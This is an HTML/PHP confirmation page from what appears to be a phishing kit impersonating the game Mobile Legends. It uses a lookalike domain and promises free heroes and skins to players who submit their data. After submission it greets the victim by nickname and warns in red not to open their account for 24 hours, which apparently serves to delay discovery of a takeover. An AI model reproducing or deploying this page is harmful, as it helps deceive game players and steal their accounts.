

<!DOCTYPE html>
<html>
<head>
<title>Mobile Legends - Mystery Shop</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:description" content="For a limited time you can buy all the heroes and skins that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="http://mobalegends.ddns.net/img/thumbnail/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<link rel="icon" type="img/png" href="img/favicon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<!-- Mobile Legends: Mystery Shop v1.1 by Abdul Malik -->
</head>
<body>

<div class="sticky">
<a href="index.php"><img src="img/logo.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="img/slider/1.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/4.jpg" style="width:100%">
</div>
</div>
<form action="logout.php" method="post">
<div class="notification-container">
<div class="notification">
<span class="title">Information</span>
<span class="label"><i class="fa fa-check-circle"></i> Success</span>
<span><br/><br/>Hi, <?php echo $nickname;?></br></br>Your request has been process.</br></br>Please wait up to 24 hours.</br></br><font color="red">DO NOT OPEN YOUR ACCOUNT UNTIL SUCCESS</font></span>
</div>
</div>
<div align="center">
<input type="submit" value="Logout"/>
</div>
</form>
<br/>
<div class="footer">Copyright &copy; 2018</div>


<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 3000);
}
</script>
</body>
</html>